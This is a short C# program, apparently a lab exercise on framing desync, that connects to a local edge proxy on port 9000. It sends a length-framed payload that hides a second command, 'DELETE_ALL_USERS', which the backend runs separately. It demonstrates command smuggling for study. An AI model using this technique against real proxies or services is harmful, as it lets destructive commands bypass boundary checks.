using System.Net.Sockets;
using System.Net;
using System.Text;

namespace Attacker
{
    // ============================================================
    // PHASE 06 ATTACKER
    // Active Boundary Exploitation
    // ============================================================

    class Attacker
    {
        static void Main()
        {
            var socket =
                new Socket(
                    AddressFamily.InterNetwork,
                    SocketType.Stream,
                    ProtocolType.Tcp);

            socket.Connect(
                new IPEndPoint(
                    IPAddress.Loopback,
                    9000));

            Console.WriteLine(
                "[ATTACKER] Connected To V2 Edge Proxy");

            // ====================================================
            // ATTACK LOGIC
            //
            // Proxy sees:
            //
            // LEN:24|HELLO\nDELETE_ALL_USERS\n
            //
            // as ONE valid frame.
            //
            // Backend reinterprets:
            //
            // HELLO
            // DELETE_ALL_USERS
            //
            // as TWO separate commands.
            //
            // ====================================================

            string innerPayload =
                "HELLO\nDELETE_ALL_USERS\n";

            string framedPayload =
                $"LEN:{innerPayload.Length}|{innerPayload}";

            Console.WriteLine(
                $"[ATTACKER] Sending => [{framedPayload}]");

            socket.Send(
                Encoding.UTF8.GetBytes(
                    framedPayload));

            Console.WriteLine(
                "[ATTACKER] Boundary Reinterpretation Triggered");

            socket.Close();
            Console.ReadLine();
        }
    }
}
